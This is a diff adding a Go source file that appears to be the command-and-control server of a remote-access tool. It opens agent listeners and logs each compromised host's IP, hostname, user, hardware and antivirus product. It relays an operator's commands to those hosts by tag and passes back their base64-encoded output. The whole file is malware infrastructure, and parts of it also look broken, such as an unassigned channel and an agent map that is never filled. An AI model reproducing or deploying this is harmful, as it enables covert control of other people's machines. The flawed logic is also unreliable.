@@ -1,0 +1,197 @@
+package main
+
+import (
+	"fmt"
+	"log"
+	"net/http"
+	"strconv"
+
+	gophersocket "github.com/whiterabb17/gopher-socket"
+	"github.com/whiterabb17/gopher-socket/transport"
+	"github.com/whiterabb17/greatwhite/modules/models"
+	"github.com/whiterabb17/greatwhite/modules/util"
+)
+
+var (
+	AdminServer  *gophersocket.Server
+	AdminChannel *gophersocket.Channel
+	Server       *gophersocket.Server
+	client       *gophersocket.Channel
+	agents       map[string]*gophersocket.Channel
+	PortMap      map[int]bool
+)
+
+func SendToFrontend(cl *gophersocket.Channel, eventMsg, msg string) {
+	cl.Emit(eventMsg, msg)
+}
+
+func addToPortMap(port int, status bool) {
+	if PortMap == nil {
+		PortMap = make(map[int]bool)
+	}
+
+	PortMap[port] = status
+	log.Println(PortMap)
+}
+
+func removeFromPortMap(port int) {
+	_, found := PortMap[port]
+	if found {
+		delete(PortMap, port)
+	}
+	log.Println(PortMap)
+}
+
+// MessageHandler is a functions that handles messages
+func CreateListeningServer(name string, port int) {
+	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
+	newListener := &models.Listener{
+		Name:   name,
+		Port:   port,
+		Server: server,
+	}
+	models.Network = append(models.Network, newListener)
+	serveMux := http.NewServeMux()
+	serveMux.Handle("/socket.io/", server)
+	server.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
+		//client id is unique
+		log.Println("New client connected, client id is ", c.Id())
+		SendToFrontend(client, "alert", "New client connected, client id is "+c.Id())
+	})
+	server.On("register", func(c *gophersocket.Channel, info models.ClientInfo) {
+		cinfo := models.ClientInfo{
+			SocketID:  c.Id(),
+			Tag:       info.Tag,
+			Version:   info.Version,
+			IPAddr:    info.IPAddr,
+			Hostname:  info.Hostname,
+			User:      info.User,
+			OS:        info.OS,
+			Arch:      info.Arch,
+			CPU:       info.CPU,
+			GPU:       info.GPU,
+			Memory:    info.Memory,
+			AntiVirus: info.AntiVirus,
+		}
+		models.ClientList = append(models.ClientList, cinfo)
+		toSend := fmt.Sprintf("%s#%s#Golang", info.Tag, info.OS)
+		SendToFrontend(client, "newClient", toSend)
+		client.Emit("register", cinfo)
+	})
+	//on disconnection handler, if client hangs connection unexpectedly, it will still occurs
+	//you can omit function args if you do not need them
+	//you can return string value for ack, or return nothing for emit
+	server.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel) {
+		var _clientList []models.ClientInfo
+		var discon string
+		for _, s := range models.ClientList {
+			if s.SocketID != c.Id() {
+				_clientList = append(_clientList, s)
+			} else {
+				discon = s.Tag
+			}
+		}
+		models.ClientList = _clientList
+		_clientList = nil
+		log.Println("Client Disconnected, client id is ", c.Id())
+		SendToFrontend(client, "alert", "[<i>!</i>] Client <b>"+discon+"</b> Disconnected")
+		SendToFrontend(client, "discon", discon)
+	})
+	//error catching handler
+	server.On(gophersocket.OnError, func(c *gophersocket.Channel) {
+		log.Println("Error from " + c.Id())
+		SendToFrontend(client, "svrerror", "Error from: "+c.Id())
+	})
+	server.On("repl", func(c *gophersocket.Channel, resp models.Resp) {
+		response, err := util.Fb64(resp.Resp)
+		if err != nil {
+			response = resp.Resp
+		}
+		tag, err := util.Fb64(resp.Tag)
+		if err != nil {
+			tag = resp.Tag
+		}
+		log.Println(resp)
+		SendToFrontend(client, "response", tag+"::"+fmt.Sprintf("Reponse: <i>%s</i>", response))
+	})
+	server.On("error", func(c *gophersocket.Channel, resp models.Resp) {
+		response, err := util.Fb64(resp.Resp)
+		if err != nil {
+			response = resp.Resp
+		}
+		tag, err := util.Fb64(resp.Tag)
+		if err != nil {
+			tag = resp.Tag
+		}
+		log.Println(resp)
+		SendToFrontend(client, "error", tag+"::"+(fmt.Sprintf("<u>Error Encountered</u>\nReponse: <i>%s</i>", response)))
+	})
+	log.Println(http.ListenAndServe(":"+strconv.Itoa(port), serveMux))
+}
+
+func getChannelByTag(tag string) *gophersocket.Channel {
+	for k, _ := range agents {
+		if k == tag {
+			return agents[tag]
+		}
+	}
+	return nil
+}
+
+func AddToAgentMap(name string, channel *gophersocket.Channel) {
+	_, found := agents[name]
+	if !found {
+		agents[name] = channel
+	}
+}
+
+func RemoveFromAgentMap(cha *gophersocket.Channel) {
+	for key, value := range agents {
+		if value == cha {
+			delete(agents, key)
+		}
+	}
+}
+
+func main() {
+	AdminServer := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
+	AdminServer.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
+		//client id is unique
+		log.Println("New Admin connected, Admin id is ", c.Id()+" \n\n\n")
+		if len(models.Network) > 0 {
+			log.Println("There are open listeners!")
+			var portStr string
+			for _, item := range models.Network {
+				portStr += item.Name + "@" + strconv.Itoa(item.Port) + "|"
+			}
+			log.Println(portStr)
+			//	c.Emit("portmap", models.Packet{Event: "portmap", Message: portStr})
+		}
+		AdminChannel = c
+	})
+	AdminServer.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel, args interface{}) {
+		//client id is unique
+		log.Println("Admin with ID " + c.Id() + " has disconnected \n\n\n")
+	})
+	AdminServer.On("log", func(c *gophersocket.Channel, packet models.Packet) {
+		//client id is unique
+		log.Println(packet)
+	})
+	AdminServer.On("sendToClient", func(c *gophersocket.Channel, toClient models.ToClient) {
+		//log.Println(toClient)
+		log.Println("To Send: \nReciever: " + toClient.Tag + "\nCommand: " + toClient.Command + " \nData: " + toClient.Data)
+		cChan := getChannelByTag(toClient.Tag)
+		cChan.Emit(toClient.Command, models.Resp{Resp: toClient.Data, Tag: toClient.Tag})
+	})
+	AdminServer.On("newListener", func(c *gophersocket.Channel, message models.Packet) {
+		log.Println("Starting a new listener on: " + message.Message + " \n\n\n")
+		port, _ := strconv.Atoi(message.Message)
+		CreateListeningServer(message.Event, port)
+		det := message.Event + ":" + message.Message
+		c.Emit("listener", models.Packet{Event: "started", Message: det})
+	})
+	serveMux := http.NewServeMux()
+	serveMux.Handle("/socket.io/", AdminServer)
+	log.Println("Starting Admin Relay Channel \n\n\n")
+	log.Println(http.ListenAndServe(":55556", serveMux))
+}
